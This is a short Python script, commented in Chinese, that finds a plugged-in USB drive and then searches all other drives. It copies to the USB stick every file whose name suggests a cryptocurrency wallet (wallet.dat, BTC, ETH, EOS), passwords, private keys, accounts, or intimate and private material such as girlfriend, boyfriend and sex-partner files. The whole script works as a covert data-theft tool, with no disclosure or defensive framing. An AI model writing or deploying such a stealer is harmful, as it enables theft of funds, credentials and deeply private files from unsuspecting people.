# -*- coding: UTF-8 -*-
import os
import shutil
import psutil
import time

# 判断U盘的盘符
_Aldisk=[]
disk = psutil.disk_partitions()
for i in disk:
    _Aldisk.append(i.device)
    k = i.opts.split(",")
    if k[1] == "removable":
        a = i.device
        _Aldisk.remove(a)
        break

# 判断是否存在指定目录
k_1 = a +"一梦千秋"+"\\"
_TIME = time.strftime("%Y-%m-%d--%H", time.localtime())
url = os.path.join(k_1,_TIME)
is_yes = os.path.exists(url)
if is_yes == True:
    pass
else:
    os.makedirs(url)
# 执行具体的命令
b =[]
aa=["wallet.dat","密码","BTC","ETH","EOS","账户","号码","重要","私人","隐私","我的","私钥","加密","隐私","炮友","女友","男友"]
#aa=["应"]
c=0
kk=0
kkk=0
for i in _Aldisk:
    a1 = os.walk(i)
    for j in a1:
        for l in j[2]:
            for k1 in aa:
                if k1 in l and j[0] != url:
                    shutil.copy(os.path.join(j[0],l), url)
                    kk+=1



















